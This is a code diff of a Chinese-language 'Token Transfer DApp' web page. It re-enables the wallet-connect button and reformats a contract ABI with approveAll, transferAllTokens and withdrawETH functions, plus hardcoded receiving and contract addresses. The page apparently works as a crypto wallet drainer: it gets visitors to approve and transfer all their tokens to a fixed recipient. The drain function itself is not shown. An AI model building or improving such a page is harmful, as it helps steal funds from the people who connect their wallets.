@@ -47,7 +47,7 @@
 <body>
     <div class="container">
         <h1>Token Transfer DApp</h1>
-        <button id="connectWallet" onclick="connectWallet()" disabled>连接钱包</button>
+        <button id="connectWallet" onclick="connectWallet()">连接钱包</button>
         <button id="authorizeTransfer" onclick="authorizeAndTransfer()" disabled>授权并转移代币</button>
         <p id="status">请先连接钱包。</p>
     </div>
@@ -59,81 +59,81 @@
         const contractAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699'; // 你的接收地址
         const tokenAddress = '0x56a2777e796eF23399e9E1d791E1A0410a75E31b'; // 你的已部署的合约地址
         const tokenABI = [
-	{
-		"inputs": [
-			{
-				"internalType": "contract IERC20",
-				"name": "token",
-				"type": "address"
-			}
-		],
-		"name": "approveAll",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "contract IERC20",
-				"name": "token",
-				"type": "address"
-			}
-		],
-		"name": "transferAllTokens",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"stateMutability": "nonpayable",
-		"type": "constructor"
-	},
-	{
-		"inputs": [],
-		"name": "withdrawETH",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"stateMutability": "payable",
-		"type": "receive"
-	},
-	{
-		"inputs": [],
-		"name": "owner",
-		"outputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "recipient",
-		"outputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	}
-];
+            // ABI 内容...
+            {
+                "inputs": [
+                    {
+                        "internalType": "contract IERC20",
+                        "name": "token",
+                        "type": "address"
+                    }
+                ],
+                "name": "approveAll",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "contract IERC20",
+                        "name": "token",
+                        "type": "address"
+                    }
+                ],
+                "name": "transferAllTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "inputs": [],
+                "name": "withdrawETH",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "stateMutability": "payable",
+                "type": "receive"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "recipient",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ];
 
         // 初始化 Web3
         async function connectWallet() {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
-                document.getElementById("connectWallet").disabled = true; // 禁用按钮
 
                 try {
                     // 请求连接钱包
@@ -144,8 +144,6 @@
                 } catch (error) {
                     console.error("钱包连接错误:", error);
                     document.getElementById("status").innerText = "钱包连接失败: " + error.message;
-                } finally {
-                    document.getElementById("connectWallet").disabled = false; // 请求完成后启用按钮
                 }
             } else {
                 document.getElementById("status").innerText = "请安装 MetaMask 或确保浏览器支持 Web3!";
